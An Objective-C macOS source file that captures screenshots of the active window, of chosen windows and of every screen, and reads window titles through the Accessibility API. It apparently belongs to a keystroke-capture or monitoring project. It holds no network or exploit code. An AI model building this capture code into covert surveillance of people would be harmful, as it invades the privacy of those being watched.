//
//  ScreenshotUtils.m
//  KeyboardCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/27/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ScreenshotUtils.h"

#import <AppKit/AppKit.h>
#import <SystemConfiguration/SystemConfiguration.h>


static ScreenshotUtils *_ScreenshotUtils=nil;

@interface ScreenshotUtils (private)
+ (NSImage *) takeFrontWindowShotWithPID: (NSNumber *) aPID;
+ (CGRect) frontWindowRectWithPID: (NSNumber *) aPID;
+ (NSImage *) imageWithWindowDicts: (NSArray *) aWindowDicts;
+ (NSImage *) combineImages: (NSArray *) aImages vertical: (BOOL) aVertical;
@end

@implementation ScreenshotUtils

+ (id)sharedInstance{
    if (_ScreenshotUtils==nil) {
        _ScreenshotUtils = [[ScreenshotUtils alloc]init];
    }
    return _ScreenshotUtils;
}

+ (NSImage *) takeFrontWindowShot {
    NSDictionary *activeApplication = [[NSWorkspace sharedWorkspace] activeApplication];
    NSNumber *activeAppPID = [activeApplication objectForKey:@"NSApplicationProcessIdentifier"];
    return ([self takeFrontWindowShotWithPID:activeAppPID]);
}

+ (NSImage *) takeFrontAllWindowsShot {
    
    NSImage *finalWindowImage = nil;
    NSDictionary *activeApplication = [[NSWorkspace sharedWorkspace] activeApplication];
    NSNumber *activeAppPID = [activeApplication objectForKey:@"NSApplicationProcessIdentifier"];
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    NSMutableArray *frontWindowImages = [NSMutableArray array];
    NSMutableArray *windowDicts = [NSMutableArray array];
    CFMutableArrayRef windowIDs = CFArrayCreateMutable(NULL, 5, NULL);
    for (int i = [(NSArray *)windowList count] - 1; i >= 0; i--) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        if ([activeAppPID isEqualToNumber:windowPID] && [windowLayer integerValue] == 0) {
            CGRect imageBounds = windowBounds;
            CGWindowID windowID = [[windowDict objectForKey:(NSString *)kCGWindowNumber] unsignedIntValue];
            
            CGImageRef cgWindowImage = CGWindowListCreateImage(imageBounds, kCGWindowListOptionIncludingWindow, windowID, kCGWindowImageDefault);
            NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:cgWindowImage];
            NSImage *windowImage = [[[NSImage alloc] init] autorelease];
            [windowImage addRepresentation:bitmapRep];
            CGImageRelease(cgWindowImage);
            [bitmapRep release];
            
            
            [frontWindowImages addObject:windowImage];
            [windowDicts addObject:windowDict];
            CFNumberRef windowIDRef = (CFNumberRef)[windowDict objectForKey:(NSString *)kCGWindowNumber];
            CFArrayAppendValue(windowIDs, (const void *)windowIDRef);
        }
    }
    
    if ([frontWindowImages count] > 1) {
        //finalWindowImage = [self imageWithWindowDicts:windowDicts];
        finalWindowImage = [self combineImages:frontWindowImages vertical:YES];
    } else if ([frontWindowImages count] == 1) {
        finalWindowImage = [frontWindowImages firstObject];
    }
    CFRelease(windowIDs);
    CFBridgingRelease(windowList);
    
    
    return (finalWindowImage);
}

+ (NSImage *) takeWindowShotWithBundleID: (NSString *) aBundleID windowID: (NSNumber *) aWindowID {
     
    NSImage *windowImage = nil;
    NSArray *rApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:aBundleID];
    NSRunningApplication *rApp = [rApps firstObject];
    NSNumber *activeAppPID = [NSNumber numberWithInteger:[rApp processIdentifier]];
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = 0; i < [(NSArray *)windowList count]; i++) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        NSNumber *windowID = [windowDict objectForKey:(NSString *)kCGWindowNumber];
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        if ([activeAppPID isEqualToNumber:windowPID] && [windowLayer integerValue] == 0 && [aWindowID isEqualToNumber:windowID]) {
            CGRect imageBounds = windowBounds;
            CGWindowID windowID = [[windowDict objectForKey:(NSString *)kCGWindowNumber] unsignedIntValue];
            CGImageRef cgWindowImage = CGWindowListCreateImage(imageBounds, kCGWindowListOptionIncludingWindow, windowID, kCGWindowImageDefault);
            NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:cgWindowImage];
            windowImage = [[[NSImage alloc] init] autorelease];
            [windowImage addRepresentation:bitmapRep];
            CGImageRelease(cgWindowImage);
            [bitmapRep release];
            
            break;
        }
    }
    CFBridgingRelease(windowList);
    
    
    return (windowImage);
}

+ (NSImage *) takeFrontWindowShotWithBundleID: (NSString *) aBundleID {
    NSNumber *activeAppPID = nil;
    NSArray *runningApps = [[NSWorkspace sharedWorkspace] runningApplications];
    for (NSRunningApplication *runningApp in runningApps) {
        if ([[runningApp bundleIdentifier] isEqualToString:aBundleID]) {
            activeAppPID = [NSNumber numberWithInteger:[runningApp processIdentifier]];
            break;
        }
    }
    
    return [self takeFrontWindowShotWithPID:activeAppPID];
}

+ (NSImage *)takeScreenShot{
    
    NSWindow * transWindow = [[NSWindow alloc] initWithContentRect:[[NSScreen mainScreen] frame] styleMask:NSBorderlessWindowMask  backing:NSBackingStoreBuffered defer:NO];
    CGWindowID windowID = (CGWindowID)[transWindow windowNumber];
    CGRect windowRect = NSRectToCGRect( [transWindow frame] );
    windowRect.origin.y = NSMaxY( [[transWindow screen] frame] ) - NSMaxY( [transWindow frame] );
    CGImageRef captureImage = CGWindowListCreateImage( windowRect, kCGWindowListOptionOnScreenBelowWindow, windowID, kCGWindowImageDefault );
    NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:captureImage];
    NSImage * image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    //NSData* pngData = [bitmapRep representationUsingType:NSPNGFileType properties:nil];
    CGImageRelease(captureImage);
    [bitmapRep release];
    [transWindow release];
    
    
    return [image autorelease];
}

+ (NSImage *) takeScreenShotWithScreen: (NSScreen *) aScreen {
    
    NSWindow * transWindow = [[NSWindow alloc] initWithContentRect:[aScreen frame] styleMask:NSBorderlessWindowMask  backing:NSBackingStoreBuffered defer:NO];
    CGWindowID windowID = (CGWindowID)[transWindow windowNumber];
    CGRect windowRect = NSRectToCGRect( [transWindow frame] );
    windowRect.origin.y = NSMaxY( [[transWindow screen] frame] ) - NSMaxY( [transWindow frame] );
    CGImageRef captureImage = CGWindowListCreateImage( windowRect, kCGWindowListOptionOnScreenBelowWindow, windowID, kCGWindowImageDefault );
    NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:captureImage];
    NSImage * image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    CGImageRelease(captureImage);
    [bitmapRep release];
    
    [transWindow release];
    
    return ([image autorelease]);
}

+ (NSArray *)takeScreenShots {
    
    NSMutableArray *screenshots = [[NSMutableArray alloc]init];
    for (NSScreen *screen in [NSScreen screens]) {
        NSWindow * transWindow = [[NSWindow alloc] initWithContentRect:[screen frame] styleMask:NSBorderlessWindowMask  backing:NSBackingStoreBuffered defer:NO];
        CGWindowID windowID = (CGWindowID)[transWindow windowNumber];
        CGRect windowRect = NSRectToCGRect( [transWindow frame] );
        windowRect.origin.y = NSMaxY( [[transWindow screen] frame] ) - NSMaxY( [transWindow frame] );
        CGImageRef captureImage = CGWindowListCreateImage( windowRect, kCGWindowListOptionOnScreenBelowWindow, windowID, kCGWindowImageDefault );
        NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:captureImage];
        NSImage * image = [[NSImage alloc] init];
        [image addRepresentation:bitmapRep];
        [screenshots addObject:image];
        [image release];
        CGImageRelease(captureImage);
        [bitmapRep release];
        [transWindow release];
    }
    
    return ([screenshots autorelease]);
}

+ (NSData *)scale:(NSImage *)aNSImage X:(float)aX Y:(float)aY{
    NSSize outputSize = NSMakeSize(aX,aY);
    NSImage *anImage  = [self scaleImage:aNSImage toSize:outputSize];
    NSData *imageData = [anImage TIFFRepresentation];
    NSBitmapImageRep *rep = [NSBitmapImageRep imageRepWithData:imageData];
    NSData *dataToWrite = [rep representationUsingType:NSPNGFileType properties:nil];
    return dataToWrite;
}

+ (NSImage *)scaleImage:(NSImage *)image toSize:(NSSize)targetSize{
    if ([image isValid]) {
        NSSize imageSize = [image size];
        float width  = imageSize.width;
        float height = imageSize.height;
        float targetWidth  = targetSize.width;
        float targetHeight = targetSize.height;
        float scaleFactor  = 0.0;
        float scaledWidth  = targetWidth;
        float scaledHeight = targetHeight;
        NSPoint thumbnailPoint = NSZeroPoint;
        if (!NSEqualSizes(imageSize, targetSize)){
            float widthFactor  = targetWidth / width;
            float heightFactor = targetHeight / height;
            if (widthFactor < heightFactor){
                scaleFactor = widthFactor;
            }else{
                scaleFactor = heightFactor;
            }
            scaledWidth  = width  * scaleFactor;
            scaledHeight = height * scaleFactor;
            if (widthFactor < heightFactor) {
                thumbnailPoint.y = (targetHeight - scaledHeight) * 0.5;
            }else if (widthFactor > heightFactor) {
                thumbnailPoint.x = (targetWidth - scaledWidth) * 0.5;
            }
            NSImage *newImage = [[NSImage alloc] initWithSize:targetSize];
            [newImage lockFocus];
            NSRect thumbnailRect;
            thumbnailRect.origin = thumbnailPoint;
            thumbnailRect.size.width = scaledWidth;
            thumbnailRect.size.height = scaledHeight;
            [image drawInRect:thumbnailRect fromRect:NSZeroRect operation:NSCompositeSourceOver fraction:1.0];
            [newImage unlockFocus];
            return newImage;
        }
    }
    return nil;
}

+ (NSString *) frontWindowTitleWithPID: (NSNumber *) aPID {
    AXUIElementRef app = AXUIElementCreateApplication([aPID integerValue]);
    AXUIElementRef frontWindow = NULL;
    AXError err = AXUIElementCopyAttributeValue( app, kAXMainWindowAttribute, (CFTypeRef *)&frontWindow);
    if ( err != kAXErrorSuccess ) {
        
    }
    NSArray *result = nil;
    
    AXUIElementCopyAttributeValues(
                                   (AXUIElementRef) app,
                                   kAXWindowsAttribute,
                                   0,
                                   99999,
                                   (CFArrayRef *) &result
                                   );
    
//    DLog(@"app %@", app);
//    DLog(@"result %@", result);
    
    NSString *title = nil;
    if ([result count]) {
        id target = [result firstObject];
        
        CFTypeRef posValue = nil;
        CFTypeRef sizeValue = nil;
        CFTypeRef titleValue = nil;
        CFTypeRef valueValue = nil;
        CFTypeRef helpValue = nil;
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXPositionAttribute, (CFTypeRef*)&posValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXSizeAttribute, (CFTypeRef*)&sizeValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXTitleAttribute, (CFTypeRef*)&titleValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXValueAttribute, (CFTypeRef*)&valueValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXHelpAttribute, (CFTypeRef*)&helpValue);
        
        CGPoint point;
        CGSize size;
        AXValueGetValue(posValue, kAXValueCGPointType, &point);
        AXValueGetValue(sizeValue, kAXValueCGSizeType, &size);
        
//        DLog(@"========================= Title, 1st AXUIElementRef ==============================");
//        DLog(@"point: %@", NSStringFromPoint(NSPointFromCGPoint(point)));
//        DLog(@"size: %@", NSStringFromSize(NSSizeFromCGSize(size)));
        
//        DLog(@"posValue = %@", posValue);
//        DLog(@"sizeValue = %@", sizeValue);
//        DLog(@"titleValue = %@", titleValue);
//        DLog(@"valueValue = %@", valueValue);
//        DLog(@"helpValue = %@", helpValue);
        
        // Print to standard output and the result is the same as DLog above
//        CFShow(posValue);
//        CFShow(sizeValue);
//        CFShow(titleValue);
//        CFShow(valueValue);
//        CFShow(helpValue);
        
        if (titleValue) {
            if (CFGetTypeID(titleValue) == CFStringGetTypeID()) {
                // Below code cause issue with LINE window title where CFStringRef cast from CFTypeRef always contains junk at the end of string (like zero teminated string)
                //title = [(NSString *)(CFStringRef)titleValue retain];
                //DLog(@"title = %@, %@", title, [title class]);
                
                CFIndex length = CFStringGetLength((CFStringRef)titleValue);
                UniChar ch = CFStringGetCharacterAtIndex(titleValue, length - 1);
                if (ch == '\0') {
                    length -= 1;
                    DLog(@"Omit null teminated character, length = %ld", length);
                }
                CFStringRef temp = CFStringCreateWithSubstring(nil, (CFStringRef)titleValue, CFRangeMake(0, length));
                title = (NSString *)temp;
                DLog(@"title = %@, %@", title, [title class]);
            }
            CFRelease(titleValue);
        }
        
        if (valueValue) {
            if (CFGetTypeID(valueValue) == CFStringGetTypeID()) {
                NSString *value = [(NSString *)(CFStringRef)valueValue retain];
                DLog(@"value = %@, %@", value, [value class]);
            }
            CFRelease(valueValue);
        }
        
        if (helpValue) {
            if (CFGetTypeID(helpValue) == CFStringGetTypeID()) {
                NSString *help = [(NSString *)(CFStringRef)helpValue retain];
                DLog(@"help = %@, %@", help, [help class]);
            }
            CFRelease(helpValue);
        }
        
        if (sizeValue) CFRelease(sizeValue);
        if (posValue) CFRelease(posValue);
        
    }
    
    [result release];
    
    if (frontWindow) CFRelease(frontWindow);
    if (app) CFRelease(app);
    
    return ([title autorelease]);
}

+ (CGRect) frontmostWindowRectWithPID: (NSNumber *) aPID {
    return ([self frontWindowRectWithPID:aPID]);
}

+ (CGRect) windowRectWithWindowID:(NSNumber *)aWindowID {
    //NSArray *windowIDs = [NSArray arrayWithObject:aWindowID];
    uint32_t windowid[1] = {[aWindowID integerValue]};
    CFArrayRef windowArray = CFArrayCreate ( NULL, (const void **)windowid, 1 ,NULL);
    CFArrayRef windowList = CGWindowListCreateDescriptionFromArray(windowArray);
    DLog(@"windowList: %@", windowList);
    NSDictionary * windowDict = [(NSArray *)windowList firstObject];
    CGRect windowBounds = CGRectNull;
    CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
    CFBridgingRelease(windowList);
    CFRelease(windowArray);
    DLog(@"windowBounds: %@", NSStringFromRect(NSRectFromCGRect(windowBounds)));
    return (windowBounds);
}

#pragma mark - Private methods

+ (NSImage *) takeFrontWindowShotWithPID: (NSNumber *) aPID {
    
    NSImage *windowImage = nil;
    NSNumber *activeAppPID = aPID;
    CGRect frontWindowRect = [self frontWindowRectWithPID:activeAppPID];
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = [(NSArray *)windowList count] - 1; i >= 0; i--) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        if ([activeAppPID isEqualToNumber:windowPID] && [windowLayer integerValue] == 0 &&
            CGSizeEqualToSize(frontWindowRect.size, windowBounds.size) && CGPointEqualToPoint(frontWindowRect.origin, windowBounds.origin)) {
            CGRect imageBounds = windowBounds;
            CGWindowID windowID = [[windowDict objectForKey:(NSString *)kCGWindowNumber] unsignedIntValue];
            CGImageRef cgWindowImage = CGWindowListCreateImage(imageBounds, kCGWindowListOptionIncludingWindow, windowID, kCGWindowImageDefault);
            NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:cgWindowImage];
            windowImage = [[[NSImage alloc] init] autorelease];
            [windowImage addRepresentation:bitmapRep];
            CGImageRelease(cgWindowImage);
            [bitmapRep release];
            
            //DLog(@"windowDict = %@", windowDict);
            //DLog(@"kCGWindowBounds = %@, %@", [windowDict objectForKey:(NSString *)kCGWindowBounds], [[windowDict objectForKey:(NSString *)kCGWindowBounds] class]);
            break;
        }
    }
    
    //DLog(@"windowList = %@", (NSArray *)windowList);
    //DLog(@"activeApplication = %@", activeApplication);
    CFBridgingRelease(windowList);
    
    
    return (windowImage);
}

+ (CGRect) frontWindowRectWithPID: (NSNumber *) aPID {
    DLog(@"Getting front window rect of %@", aPID);
    AXUIElementRef app = AXUIElementCreateApplication([aPID integerValue]);
    AXUIElementRef frontWindow = NULL;
    AXError err = AXUIElementCopyAttributeValue( app, kAXMainWindowAttribute, (CFTypeRef *)&frontWindow);
    if ( err != kAXErrorSuccess ) {
        DLog(@"kAXMainWindowAttribute err = %ld", (signed long)err);
    }
    NSArray *result = nil;
    
    AXUIElementCopyAttributeValues(
                                   (AXUIElementRef) app,
                                   kAXWindowsAttribute,
                                   0,
                                   99999,
                                   (CFArrayRef *) &result
                                   );
    
//    DLog(@"app %@", app);
//    DLog(@"result %@", result);
    
    //
    for (id target in result) {
        CFTypeRef posValue = nil;
        CFTypeRef sizeValue = nil;
        CFTypeRef titleValue = nil;
        CFTypeRef valueValue = nil;
        CFTypeRef helpValue = nil;
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXPositionAttribute, (CFTypeRef*)&posValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXSizeAttribute, (CFTypeRef*)&sizeValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXTitleAttribute, (CFTypeRef*)&titleValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXValueAttribute, (CFTypeRef*)&valueValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXHelpAttribute, (CFTypeRef*)&helpValue);
        
        CGPoint point;
        CGSize size;
        AXValueGetValue(posValue, kAXValueCGPointType, &point);
        AXValueGetValue(sizeValue, kAXValueCGSizeType, &size);
        
//        DLog(@"point: %@", NSStringFromPoint(NSPointFromCGPoint(point)));
//        DLog(@"size: %@", NSStringFromSize(NSSizeFromCGSize(size)));
        
//        DLog(@"posValue = %@", posValue);
//        DLog(@"sizeValue = %@", sizeValue);
//        DLog(@"titleValue = %@", titleValue);
//        DLog(@"valueValue = %@", valueValue);
//        DLog(@"helpValue = %@", helpValue);
        
        if (titleValue) CFRelease(titleValue);
        if (sizeValue) CFRelease(sizeValue);
        if (posValue) CFRelease(posValue);
        if (valueValue) CFRelease(valueValue);
        if (helpValue) CFRelease(helpValue);
    }
    
    CGRect frontWindowRect;
    if ([result count]) {
        id target = [result firstObject];
        
        CFTypeRef posValue = nil;
        CFTypeRef sizeValue = nil;
        CFTypeRef titleValue = nil;
        CFTypeRef valueValue = nil;
        CFTypeRef helpValue = nil;
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXPositionAttribute, (CFTypeRef*)&posValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXSizeAttribute, (CFTypeRef*)&sizeValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXTitleAttribute, (CFTypeRef*)&titleValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXValueAttribute, (CFTypeRef*)&valueValue);
        AXUIElementCopyAttributeValue((AXUIElementRef)target, kAXHelpAttribute, (CFTypeRef*)&helpValue);
        
        CGPoint point;
        CGSize size;
        AXValueGetValue(posValue, kAXValueCGPointType, &point);
        AXValueGetValue(sizeValue, kAXValueCGSizeType, &size);
        
//        DLog(@"========================= Rect, 1st AXUIElementRef ==============================");
//        DLog(@"point: %@", NSStringFromPoint(NSPointFromCGPoint(point)));
//        DLog(@"size: %@", NSStringFromSize(NSSizeFromCGSize(size)));
        
//        DLog(@"posValue = %@", posValue);
//        DLog(@"sizeValue = %@", sizeValue);
//        DLog(@"titleValue = %@", titleValue);
//        DLog(@"valueValue = %@", valueValue);
//        DLog(@"helpValue = %@", helpValue);
        
        frontWindowRect.size = size;
        frontWindowRect.origin = point;
        
        if (titleValue) CFRelease(titleValue);
        if (sizeValue) CFRelease(sizeValue);
        if (posValue) CFRelease(posValue);
        if (valueValue) CFRelease(valueValue);
        if (helpValue) CFRelease(helpValue);
    }
    
    [result release];
    
    if (frontWindow) CFRelease(frontWindow);
    if (app) CFRelease(app);
    
    return (frontWindowRect);
}

+ (NSImage *) imageWithWindowDicts: (NSArray *) aWindowDicts {
    
    CGColorSpaceRef rgbColorSpace = CGColorSpaceCreateDeviceRGB();
    CGRect mainScreenRect = NSRectToCGRect([[NSScreen mainScreen] frame]);
    CGContextRef contextRef = CGBitmapContextCreate(NULL,  mainScreenRect.size.width, mainScreenRect.size.height, 8, 0, rgbColorSpace, kCGImageAlphaPremultipliedFirst);
    DLog(@"mainScreenRect, %@", NSStringFromRect(NSRectFromCGRect(mainScreenRect)));
    
    NSDictionary *windowDict = nil;
    NSEnumerator *enumerator = [aWindowDicts reverseObjectEnumerator];
    while (windowDict = [enumerator nextObject]) {
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        
        CGRect imageBounds = windowBounds;
        CGWindowID windowID = [[windowDict objectForKey:(NSString *)kCGWindowNumber] unsignedIntValue];
        
        CGImageRef cgWindowImage = CGWindowListCreateImage(imageBounds, kCGWindowListOptionIncludingWindow, windowID, kCGWindowImageDefault);
        NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:cgWindowImage];
        NSImage *image = [[[NSImage alloc] init] autorelease];
        [image addRepresentation:bitmapRep];
        CGImageRelease(cgWindowImage);
        [bitmapRep release];
        
        CGImageSourceRef source = CGImageSourceCreateWithData((CFDataRef)[image TIFFRepresentation], NULL);
        CGImageRef cgimage = CGImageSourceCreateImageAtIndex(source, 0, NULL);
        
        CGContextDrawImage(contextRef, CGRectMake(imageBounds.origin.x, imageBounds.origin.y, imageBounds.size.width, imageBounds.size.height), cgimage);
        DLog(@"imageBounds, %@", NSStringFromRect(NSRectFromCGRect(imageBounds)));
        
        CGImageRelease(cgimage);
        CFRelease(source);
    }
    
    CGImageRef finalCGImage = CGBitmapContextCreateImage(contextRef);
    NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:finalCGImage];
    NSImage *finalImage = [[[NSImage alloc] init] autorelease];
    [finalImage addRepresentation:bitmapRep];
    CGImageRelease(finalCGImage);
    [bitmapRep release];
    
    CGContextRelease(contextRef);
    CGColorSpaceRelease(rgbColorSpace);
    
    
    return (finalImage);
}

+ (NSImage *) combineImages: (NSArray *) aImages vertical: (BOOL) aVertical {
    
    CGFloat biggestWidth = 0.0;
    CGFloat biggestHeight = 0.0;
    CGFloat width = 0.0;
    CGFloat height = 0.0;
    for (NSImage *image in aImages) {
        if ([image size].width > biggestWidth) {
            biggestWidth = [image size].width;
        }
        if ([image size].height > biggestHeight) {
            biggestHeight = [image size].height;
        }
        
        width += [image size].width;
        height += [image size].height;
        
    }
    
    CGColorSpaceRef rgbColorSpace = CGColorSpaceCreateDeviceRGB();
    CGContextRef contextRef = nil;
    if (aVertical) {
        contextRef = CGBitmapContextCreate(NULL,  biggestWidth, height, 8, 0, rgbColorSpace, kCGImageAlphaPremultipliedLast);
    } else {
        contextRef = CGBitmapContextCreate(NULL,  width, biggestHeight, 8, 0, rgbColorSpace, kCGImageAlphaPremultipliedLast);
    }
    
    CGFloat x = 0.0;
    CGFloat y = 0.0;
    for (NSImage *image in aImages) {
        CGImageSourceRef source = CGImageSourceCreateWithData((CFDataRef)[image TIFFRepresentation], NULL);
        CGImageRef cgimage = CGImageSourceCreateImageAtIndex(source, 0, NULL);
        
        if (aVertical) {
            CGContextDrawImage(contextRef, CGRectMake(0.0, y, [image size].width, [image size].height), cgimage);
        } else {
            CGContextDrawImage(contextRef, CGRectMake(x, 0.0, [image size].width, [image size].height), cgimage);
        }
        x += [image size].width;
        y += [image size].height;
        
        CGImageRelease(cgimage);
        CFRelease(source);
    }
    
    CGImageRef finalCGImage = CGBitmapContextCreateImage(contextRef);
    NSBitmapImageRep * bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:finalCGImage];
    NSImage *finalImage = [[[NSImage alloc] init] autorelease];
    [finalImage addRepresentation:bitmapRep];
    CGImageRelease(finalCGImage);
    [bitmapRep release];
    
    CGContextRelease(contextRef);
    CGColorSpaceRelease(rgbColorSpace);
    
    
    return (finalImage);
}

- (void)dealloc
{
    _ScreenshotUtils = nil;
    [super dealloc];
}

@end
